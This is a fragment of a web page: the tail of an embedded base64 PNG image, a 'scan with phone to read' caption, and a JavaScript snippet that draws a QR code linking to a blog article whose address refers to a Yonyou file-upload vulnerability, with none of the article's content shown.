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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-filedo-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 